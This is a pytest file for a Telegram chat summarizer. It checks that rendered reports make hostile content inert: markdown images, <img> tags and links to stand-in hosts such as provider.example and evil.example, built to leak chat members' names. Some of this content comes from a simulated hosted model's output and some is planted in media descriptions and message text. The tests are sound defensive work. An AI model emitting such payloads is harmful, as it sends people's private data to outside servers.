from __future__ import annotations

import json
import re
from collections import Counter
from datetime import timedelta

from markdown_it import MarkdownIt

from tg_summary.config import Endpoint, Role
from tg_summary.llm import StructuredCaller
from tg_summary.redact import Redactor, RosterDetector, rule_detector
from tg_summary.report import Coverage, render
from tg_summary.segment import build_chunks
from tg_summary.sources.desktop_json import DesktopJsonSource
from tg_summary.store import Store
from tg_summary.summarize import summarize

EMPTY = {"decisions": [], "open_questions": [], "action_items": [], "links": []}


def test_hostile_markdown_from_a_hosted_model_cannot_carry_rehydrated_names_out(export_dir, tmp_path, fake_llm):
    source = DesktopJsonSource(export_dir)
    store = Store(tmp_path / "chat.sqlite")
    store.bind_chat(source.chat(), source.name, source.media_root())
    store.upsert_messages(source.messages())
    msgs = store.select()
    chunks = build_chunks(msgs, {m.id: m for m in msgs}, 10_000, timedelta(hours=2))

    def hostile(user: str) -> str:
        match = re.search(r"\[PERSON_\d+\]", user)
        assert match is not None
        p = match.group(0)
        if "Notes 1" not in user:
            topic = {"title": "t", "summary": f"{p} plans", "participants": [p], "msg_ids": [2]}
            return json.dumps({"topics": [topic], **EMPTY})
        return json.dumps(
            {
                "overview": (
                    f"![pixel](https://provider.example/i.png?n={p}) "
                    f'<img src="https://provider.example/x?n={p}"> '
                    f"[click](https://provider.example/c?n={p}) www.provider.example/w?n={p}"
                ),
                "themes": [{"title": f"# {p}", "summary": f"1. {p} leads", "key_points": [], "msg_ids": [2]}],
                **EMPTY,
                "links": [{"text": "Route map: https://example.org/route/42", "msg_ids": [4]}],
            }
        )

    fake_llm(hostile)
    role = Role(endpoint=Endpoint(name="hosted", api="anthropic", trust="external"), model="m")
    caller = StructuredCaller(
        role, store, lambda: Redactor(store.vault_assign, [RosterDetector(store.sender_names()), rule_detector])
    )
    outcome = summarize(chunks, caller, budget_tokens=10_000)
    assert "Alice Moreau" in outcome.digest.overview  # rehydration did happen before rendering

    markdown = render(
        store.chat(),
        outcome,
        Coverage(msgs, {}, "m", "hosted", True, caller.stats, Counter()),
    )
    html = MarkdownIt("gfm-like").render(markdown)

    assert "<img" not in html
    hrefs = re.findall(r'href="([^"]+)"', html)
    assert "https://example.org/route/42" in hrefs  # a link that is really in the chat stays clickable
    assert all(h == "https://example.org/route/42" or h.startswith("https://t.me/c/") for h in hrefs)
    assert "<h1>Alice" not in html and "<ol>" not in html  # no headings or lists injected by model text
    outside_code = re.sub(r"<code>.*?</code>", "", html)
    assert "provider.example" not in outside_code  # crafted URLs survive only as inert code spans


def test_media_appendix_lists_each_item_with_message_links_inertly_and_can_be_turned_off(export_dir, tmp_path):
    from tg_summary.enrich import Enrichment, Entry
    from tg_summary.llm import CallStats
    from tg_summary.summarize import Digest, Outcome

    source = DesktopJsonSource(export_dir)
    store = Store(tmp_path / "chat.sqlite")
    store.bind_chat(source.chat(), source.name, source.media_root())
    store.upsert_messages(source.messages())
    msgs = store.select()
    entries = [
        Entry("photo", (5,), None, "done", "A trail map ![x](https://evil.example/?n=Alice)", None, None),
        Entry("video", (6, 9), None, "done", "Frames of a summit.", "", None),
        Entry("voice", (7,), None, "done", None, "Meet at eight.", None),
        Entry("link", (4,), "https://example.org/route/42", "opened", "A route map page.", None, None),
        Entry("link", (9,), "https://x.com/a/status/1", "failed", None, None, "url_not_allowed"),
    ]
    digest = Digest(overview="o", themes=[], decisions=[], open_questions=[], action_items=[], links=[])
    outcome = Outcome(digest, chunks=1, merge_rounds=0, dropped_citations=0, dropped_items=0)

    def page(appendix: bool) -> str:
        cov = Coverage(msgs, {}, "m", "local", False, CallStats(), Counter(), Enrichment({}, [], entries=entries))
        cov.media_appendix = appendix
        return render(store.chat(), outcome, cov)

    markdown = page(True)
    html = MarkdownIt("gfm-like").render(markdown)
    section = markdown.split("## Appendix: all media and links", 1)[1].split("## Coverage", 1)[0]
    assert "Frames of a summit. No speech." in section and 'Transcript: "Meet at eight."' in section
    assert "[#6](https://t.me/c/1234567890/6), [#9](https://t.me/c/1234567890/9)" in section
    assert "not read (url\\_not\\_allowed)" in section
    assert "<img" not in html and 'href="https://example.org/route/42"' in html  # chat URL stays clickable
    assert "evil.example" not in re.sub(r"<code>.*?</code>", "", html)
    assert "## Appendix: all media and links" not in page(False)


def test_bangers_lists_the_most_reacted_messages_above_the_threshold_inertly(export_dir, tmp_path):
    import dataclasses

    from tg_summary.llm import CallStats
    from tg_summary.summarize import Digest, Outcome

    source = DesktopJsonSource(export_dir)
    store = Store(tmp_path / "chat.sqlite")
    store.bind_chat(source.chat(), source.name, source.media_root())
    store.upsert_messages(source.messages())
    msgs = store.select()
    by_id = {m.id: m for m in msgs}
    # #9 has 6 reactions from the export; give #2 more, #3 a tie with #9, and #4 too few to count.
    by_id[2] = dataclasses.replace(by_id[2], text="![x](https://evil.example/p.png) best plan", reactions=(("🔥", 9),))
    by_id[3] = dataclasses.replace(by_id[3], reactions=(("😂", 6),))
    by_id[4] = dataclasses.replace(by_id[4], reactions=(("👍", 2),))
    msgs = [by_id[m.id] for m in msgs]
    digest = Digest(overview="o", themes=[], decisions=[], open_questions=[], action_items=[], links=[])
    outcome = Outcome(digest, chunks=1, merge_rounds=0, dropped_citations=0, dropped_items=0)

    def page(bangers: int) -> str:
        cov = Coverage(msgs, {}, "m", "local", False, CallStats(), Counter(), bangers=bangers, bangers_min_reactions=3)
        return render(store.chat(), outcome, cov)

    section = page(2).split("## Bangers", 1)[1].split("## Coverage", 1)[0]
    lines = [line for line in section.splitlines() if line.startswith("- ")]
    assert [re.search(r"\[#(\d+)\]", line).group(1) for line in lines] == ["2", "3"]  # tie: earlier #3 beats #9
    assert lines[0].startswith("- **9** (🔥 9) Alice Moreau")
    html = MarkdownIt("gfm-like").render(page(5))
    assert "<img" not in html
    assert "(👍 3 ⭐ 2 custom emoji 1)" in page(5)  # #9's own reactions, largest first
    assert "[#4]" not in page(5).split("## Bangers", 1)[1].split("## Coverage", 1)[0]  # below the threshold
    assert "## Bangers" not in page(0)
